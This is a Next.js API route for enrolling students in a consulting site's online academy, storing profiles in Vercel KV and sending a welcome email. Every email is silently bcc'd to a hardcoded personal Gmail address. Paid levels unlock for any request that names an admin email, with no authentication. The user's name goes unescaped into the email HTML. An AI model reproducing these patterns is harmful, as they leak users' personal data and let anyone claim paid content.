import { NextRequest, NextResponse } from 'next/server';
import { kv } from '@vercel/kv';
import { Resend } from 'resend';
import { trackEvent } from '@/lib/analytics';
import { isAdminEmail } from '@/lib/admin';

const KV_AVAILABLE = !!(process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN);
const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;
const FROM_EMAIL = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>';

export async function POST(request: NextRequest) {
  try {
    const { email, name, programSlug } = await request.json();

    if (!email || !programSlug) {
      return NextResponse.json({ error: 'Email and program slug required' }, { status: 400 });
    }

    const normalizedEmail = email.toLowerCase().trim();
    const studentKey = `academy:student:${normalizedEmail}`;

    if (KV_AVAILABLE) {
      // Get or create student profile
      let student = await kv.get(studentKey) as any;

      if (!student) {
        student = {
          email: normalizedEmail,
          name: name || '',
          enrolledPrograms: [],
          enrolledAt: new Date().toISOString(),
        };
      }

      // Add program if not already enrolled
      if (!student.enrolledPrograms.includes(programSlug)) {
        student.enrolledPrograms.push(programSlug);
      }
      student.lastActive = new Date().toISOString();

      // Auto-unlock all paid levels for admin emails
      if (isAdminEmail(normalizedEmail)) {
        if (!student.unlockedLevels) student.unlockedLevels = {};
        student.unlockedLevels[programSlug] = [1, 2, 3];
        if (!student.unlockedModules) student.unlockedModules = {};
      }

      await kv.set(studentKey, student);

      // Initialize progress for this program
      const progressKey = `academy:progress:${normalizedEmail}:${programSlug}`;
      const existing = await kv.get(progressKey);
      if (!existing) {
        await kv.set(progressKey, {
          programSlug,
          completedModules: [],
          currentModule: null,
          startedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        });
      }

      // Track analytics
      await trackEvent({ type: 'page_view', email: normalizedEmail, source: `academy_enroll_${programSlug}` });
    }

    // Send welcome email
    if (resend) {
      try {
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: FROM_EMAIL,
          to: normalizedEmail,
          subject: `Welcome to Mama Hala Academy!`,
          html: `
            <div style="font-family:'Segoe UI',sans-serif;max-width:500px;margin:0 auto;padding:20px;background:#FAF7F2;">
              <div style="text-align:center;padding:20px 0;">
                <h1 style="color:#7A3B5E;font-family:Georgia,serif;margin:0;">Welcome to the Academy!</h1>
                <p style="color:#8E8E9F;margin:8px 0 0;">Mama Hala Consulting</p>
              </div>
              <div style="background:white;border-radius:12px;padding:24px;margin:16px 0;">
                <p style="color:#4A4A5C;">Hi ${name || 'there'},</p>
                <p style="color:#4A4A5C;">You're now enrolled! Your learning journey is ready to begin.</p>
                <p style="color:#4A4A5C;">Take your time with each module — real growth happens when we reflect, not just read.</p>
                <div style="text-align:center;margin:24px 0;">
                  <a href="${process.env.NEXT_PUBLIC_SITE_URL || 'https://mama-hala-website.vercel.app'}/en/programs/${programSlug}#curriculum" style="display:inline-block;padding:12px 28px;background:#7A3B5E;color:white;text-decoration:none;border-radius:10px;font-weight:600;">Start Learning</a>
                </div>
              </div>
              <p style="text-align:center;color:#8E8E9F;font-size:12px;">Mama Hala Consulting — Guidance with Heart</p>
            </div>
          `,
        });
      } catch { /* don't fail enrollment over email */ }
    }

    return NextResponse.json({ success: true, enrolled: true, adminUnlocked: isAdminEmail(normalizedEmail) });
  } catch (err) {
    console.error('Enrollment error:', err);
    return NextResponse.json({ error: 'Enrollment failed' }, { status: 500 });
  }
}
